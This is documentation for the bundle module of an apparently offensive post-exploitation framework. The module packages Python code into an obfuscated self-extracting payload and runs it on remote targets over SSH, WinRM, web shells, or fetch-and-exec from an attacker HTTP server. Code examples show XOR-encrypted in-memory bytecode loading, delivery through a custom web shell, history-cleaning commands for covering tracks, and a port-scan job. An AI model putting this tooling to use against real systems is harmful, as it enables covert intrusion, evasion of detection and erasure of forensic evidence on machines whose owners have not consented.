# Bundle API

The `ofx.api.bundle` module packages the `ofx.api.*` modules used by a script into a self-extracting Python bootstrap, optionally obfuscates it, and delivers it to a remote target for execution — with no pre-existing OFX installation required on the target.

---

## Pipeline

```
script ──► detect_ofx_imports()   # AST detects which ofx.api.* are used
       ──► collect_modules()       # reads .py source from installed package
       ──► build_bundle()          # zip → base64 → bootstrap.py
       ──► obfuscate_bootstrap()   # marshal bytecode → XOR → loader.py  (optional)
       ──► deliver_and_run()       # adapter-based delivery → exec on remote
```

---

## Quick Start

```python
from ofx.api.bundle import run_remote
from ofx.api.post.runners.ssh import PostSSH

runner = PostSSH(host="10.0.0.5", user="root", password="s3cr3t")

script = """
from ofx.api.opsec import clean_history_commands
for cmd in clean_history_commands():
    print(cmd)
"""

output = run_remote(script, runner)
print(output)
```

`run_remote` is the one-shot convenience wrapper that runs the entire pipeline.  It auto-detects the best delivery adapter based on the runner's capabilities.

---

## Delivery Adapters

Delivery is handled through the `BundleAdapter` protocol.  Three built-in adapters cover all common runner types.  You can also write your own.

### Built-in Adapters

#### `UploadAdapter`

Uses `runner.upload()` + `runner.run()`.  Works with any runner that implements upload: `PostSSH`, `PostWinRM`, `PostWebShell` (with upload support), etc.

```python
from ofx.api.bundle import UploadAdapter, build_bundle, deliver_and_run

result = build_bundle(script)
adapter = UploadAdapter(runner, remote_tmp="/tmp/t.py")
output = deliver_and_run(runner, result.bootstrap, adapter=adapter)
```

| Parameter | Default | Description |
|-----------|---------|-------------|
| `remote_tmp` | `/tmp/ofx_runner.py` | Temp path on remote target |
| `python` | `"python3"` (Linux) / `"python"` (Windows) | Python interpreter name |
| `windows` | `False` | Adjusts cleanup command (`del` vs `rm`) |

#### `HttpAdapter`

Starts a local HTTP server, triggers a Python `urllib.request` fetch+exec on the remote side.  Requires **no upload support**, **no bash**, and **no curl** — only a Python interpreter on the target.

```python
from ofx.api.bundle import HttpAdapter, deliver_and_run

adapter = HttpAdapter(runner, host="10.0.0.1", port=9999, route="/payload")
output = deliver_and_run(runner, payload, adapter=adapter)
```

| Parameter | Default | Description |
|-----------|---------|-------------|
| `host` | `"0.0.0.0"` | Local IP to bind the HTTP server |
| `port` | `8888` | Local port |
| `route` | `"/run"` | URL path for the payload |
| `python` | `"python3"` / `"python"` | Remote Python interpreter |
| `windows` | `False` | Adjusts interpreter name |

#### `InlineAdapter`

Embeds the entire bootstrap as base64 inside a `python -c` one-liner.  No file is written to disk and no network connectivity is required from the target.

!!! warning
    Most shells cap command-line length (~2 MB on Linux).  Use this only with the **obfuscated loader** or small scripts.

```python
from ofx.api.bundle import InlineAdapter, deliver_and_run

adapter = InlineAdapter(runner)
output = deliver_and_run(runner, obfuscated_loader, adapter=adapter)
```

### Auto-selection (`method="auto"`)

When no explicit adapter is provided, `deliver_and_run` and `run_remote` use `make_adapter()` to pick the best option:

1. If the runner has a real `upload()` implementation → `UploadAdapter`
2. Otherwise → `HttpAdapter`

You can force a specific adapter with `method="upload"`, `method="http"`, or `method="inline"`.

### Writing a Custom Adapter

Implement the `BundleAdapter` protocol — a single `deliver(bootstrap: str) -> str` method:

```python
from ofx.api.bundle import BundleAdapter, deliver_and_run, build_bundle, obfuscate_bootstrap

class MyWebShellAdapter:
    """Custom adapter for a proprietary web shell."""

    def __init__(self, session, url):
        self.session = session
        self.url = url

    def deliver(self, bootstrap: str) -> str:
        # Upload via multipart form
        resp = self.session.post(
            self.url,
            files={"script": ("run.py", bootstrap)},
            data={"action": "exec_python"},
        )
        return resp.text

# Use it
result = build_bundle(script)
payload = obfuscate_bootstrap(result.bootstrap)
adapter = MyWebShellAdapter(session, "https://target/shell.php")
output = deliver_and_run(runner, payload, adapter=adapter)
```

Any object with a `deliver(bootstrap: str) -> str` method satisfies the protocol — no subclassing required.

---

## API Reference

### `detect_ofx_imports(script, *, extra_modules=None, source_name="<script>") -> set[str]`

Parse `script` with the Python AST and return the set of `ofx.api` top-level module names it imports.

Handles all four patterns:

```python
import ofx.api.opsec
from ofx.api import opsec, c2
from ofx.api.opsec import clean_history_commands
from ofx.api.opsec.cleanup import clean_history_commands
```

- **extra_modules**: Force-include additional module names beyond AST detection.
- **Raises `AnalysisError`** if `script` cannot be parsed.

---

### `collect_modules(module_names: set[str]) -> dict[str, bytes]`

Walk the installed `ofx` package and return `{archive_path: bytes}` for all requested modules.

Includes minimal `ofx/__init__.py` and `ofx/api/__init__.py` stubs so the extracted archive is a self-contained importable tree.

- **Raises `CollectionError`** if a module's source file cannot be found.

---

### `build_bundle(script, *, extra_modules=None, source_name="<script>") -> BundleResult`

Detect imports, collect module files, zip them with `ZIP_DEFLATED`, base64-encode the archive, and embed everything in a self-extracting bootstrap script.

Returns a frozen [`BundleResult`](#bundleresult) dataclass.

The bootstrap:
1. Decodes the embedded base64 archive.
2. Extracts it to a temporary directory.
3. Prepends the temp dir to `sys.path`.
4. `exec()`s the user script.
5. Cleans up the temp dir in a `finally` block.

---

### `obfuscate_bootstrap(bootstrap, *, key=None) -> str`

Compile `bootstrap` to a CPython code object, marshal the bytecode, XOR-encrypt it with a random (or explicit) 16-byte key, and return a tiny loader script.

The loader decrypts the bytecode entirely in memory and executes it via `exec(marshal.loads(...))` — no temporary files, no external dependencies.

```python
from ofx.api.bundle import build_bundle, obfuscate_bootstrap

result = build_bundle(my_script)
loader = obfuscate_bootstrap(result.bootstrap)
# loader is ready for delivery
```

- **key**: Explicit `bytes` key. A random 16-byte key is generated when `None`.
- **Raises `ObfuscationError`** if `bootstrap` fails to compile.

---

### `make_adapter(runner, method="auto", **kwargs) -> BundleAdapter`

Instantiate the appropriate delivery adapter.

| method | Adapter | When to use |
|--------|---------|-------------|
| `"auto"` | Auto-detected | Default — picks best adapter for the runner |
| `"upload"` | `UploadAdapter` | Runner supports `upload()` (SSH, WinRM) |
| `"http"` | `HttpAdapter` | No upload; only need `run()` + network access |
| `"inline"` | `InlineAdapter` | Small scripts; no disk writes, no network from target |

Common kwargs: `remote_tmp`, `python`, `windows`, `http_host`, `http_port`, `http_route`.

---

### `deliver_and_run(runner, bootstrap, *, adapter=None, method="auto", ...) -> str`

Deliver `bootstrap` to the remote target and execute it.

Pass a custom `adapter` to use your own delivery logic (overrides `method`).

```python
# Auto-select adapter
output = deliver_and_run(runner, payload)

# Force upload adapter
output = deliver_and_run(runner, payload, method="upload")

# Use custom adapter
output = deliver_and_run(runner, payload, adapter=MyAdapter(runner))

# Windows target
output = deliver_and_run(runner, payload, method="upload", windows=True)
```

- **Raises `DeliveryError`** on failure.
- **Raises `ValueError`** for unknown `method`.

---

### `run_remote(script, runner, *, extra_modules=None, obfuscate=True, adapter=None, method="auto", windows=False, ...) -> str`

One-shot wrapper: `build_bundle` → `obfuscate_bootstrap` (if `obfuscate=True`) → `deliver_and_run`.

```python
# SSH runner — auto-detects upload support
output = run_remote(script, ssh_runner)

# WinRM runner — Windows target
output = run_remote(script, winrm_runner, windows=True)

# Web shell with custom adapter
output = run_remote(script, runner, adapter=MyAdapter(runner))

# Force HTTP delivery (no upload needed)
output = run_remote(script, runner, method="http", http_host="10.0.0.1")
```

---

## BundleResult

```python
@dataclass(frozen=True)
class BundleResult:
    modules: frozenset[str]   # ofx.api module names included
    script: str               # original user script
    bootstrap: str            # self-extracting bootstrap
    size_bytes: int           # len(bootstrap.encode())
```

---

## Exceptions

| Exception | Raised when |
|-----------|-------------|
| `BundleError` | Base class |
| `AnalysisError` | `script` has a syntax error |
| `CollectionError` | Module source files not found on disk |
| `ObfuscationError` | Bootstrap fails to compile or marshal |
| `DeliveryError` | Upload or HTTP delivery fails |

---

## Adapter Comparison

| | `UploadAdapter` | `HttpAdapter` | `InlineAdapter` |
|--|-----------------|---------------|-----------------|
| Runner requirement | `upload()` + `run()` | `run()` only | `run()` only |
| Writes file to remote | Yes (cleaned up) | No (urllib fetch+exec) | No (base64 in command) |
| Works with SSH | Yes | Yes | Yes (small scripts) |
| Works with WinRM | Yes | Yes | Yes (small scripts) |
| Works with web shells | If upload supported | Yes | Yes (small scripts) |
| Network from target | None | Needs reach to attacker HTTP | None |
| Size limit | None | None | ~2 MB (ARG_MAX) |
| Windows support | `windows=True` | `windows=True` | `windows=True` |

---

## Workflow Snippet

```yaml
jobs:
  remote-ops:
    steps:
      - name: bundle and deliver
        script: |
          from ofx.api.bundle import run_remote
          from ofx.api.post.runners.ssh import PostSSH

          runner = PostSSH(
              host="{{ inputs.target }}",
              user="{{ secrets.ssh_user }}",
              password="{{ secrets.ssh_pass }}"
          )

          op_script = """
          from ofx.api.recon import port_scan, TOP_100_PORTS
          results = port_scan('127.0.0.1', TOP_100_PORTS)
          for r in results:
              if r.open:
                  print(f'{r.port}/tcp open')
          """

          output = run_remote(op_script, runner, obfuscate=True)
          print(output)
```

---

## See Also

- [OPSEC API](opsec.md) — Traffic blending and cleanup
- [Evasion API](evasion.md) — Payload obfuscation techniques
- [Post Runners](post-exploitation/post.md) — SSH, WinRM, web shell runners
